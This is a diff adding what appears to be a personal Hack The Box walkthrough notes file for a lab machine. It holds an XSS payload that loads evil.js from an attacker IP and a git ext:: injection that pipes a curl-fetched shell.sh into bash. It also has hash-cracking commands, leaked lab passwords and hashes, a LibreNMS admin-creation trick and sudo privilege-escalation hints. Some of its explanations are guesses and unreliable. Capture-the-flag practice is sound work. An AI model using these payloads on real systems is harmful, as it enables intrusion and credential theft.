@@ -1,0 +1,90 @@
+<head>
+	<script src="/socket.io/socket.io.js"></script>
+
+</head>
+
+
+
+
+<img SRC=c onerror="var script1 = document.createElement('script');
+script1.src = 'http://10.10.16.25:8090/evil.js';document.head.appendChild(script1);"/>
+
+
+
+
+dev-git-auto-update.chatbot.htb
+
+php -S 0.0.0.0:80
+
+
+**If reverse shell didn't work, use curl to upload revershell.sh file to the server**
+
+Sometimes when uploading shell.sh file with python http.server , it didn't work. At that time try use with PHP Server.
+----------------------------------------------------------------------------------------------------------------------
+
+ext::sh -c curl% http://10.10.16.25/shell.sh|bash
+
+
+"ext" likely stands for "execute external command" or "external command.
+It indicates that the following command should be executed as an external command, rather than as part of the current shell script or command.
+'%': This is not a standard option for curl. It's possible that it was meant to be &&, which is used to chain commands together so that the second command (bash) is executed only if the first command (curl) succeeds.
+
+
+When the database gives username and hash, combine them and burteforce
+-----------------------------------------------------------------------
+frank_dorky:$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6
+admin:$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC
+
+
+In order to find hashtype or crack when contating user in hash (use --user)
+--------------------------------------------------------------
+hashcat hash /usr/share/wordlists/rockyou.txt --user
+hashcat hash -a 3 -m 3200 /usr/share/wordlists/rockyou.txt --user
+
+
+manchesterunited
+
+
+**Before doing finding files, search with ss -tulnp , if 27017 or 3306 , we can use mongo command to extract data from database.**
+
+
+In librenms, adduser admin user is
+-------------------------------------
+#cd /opt/librenms
+#./adduser.php test test123 10  (level 10 is admin)
+
+Kai Relay
+admin
+
+
+
+FAIL: server_name is set incorrectly for your webserver, update your webserver config. localhost librenms.com
+
+When doing ssh_tunneling,do port-forwarding the same port that the victim host, because when upgrading to webserver, if you don't port forward the sameport, webserver is not fully updated.
+----------------------------------------------------------------------------------------------------------------------------------
+Like that
+----------
+
+FAIL: server_name is set incorrectly for your webserver, update your webserver config. localhost librenms.com
+
+
+#ssh -L 3000:127.0.0.1:3000 frok_donky@10.10.11.6
+
+Under the Environment
+---------------------
+
+DB_PASSWORD=mychemicalformulaX
+
+
+
+
+User kai_relay may run the following commands on forumlax:
+    (ALL) NOPASSWD: /usr/bin/office.sh
+
+#!/bin/bash
+/usr/bin/soffice --calc --accept="socket,host=localhost,port=2002;urp;" --norestore --nologo --nodefault --headless
+
+
+if you create some python file under /tmp, it needs to install some python library
+But if you create python file under /dev/shm, you don't need any necessary library file.
+
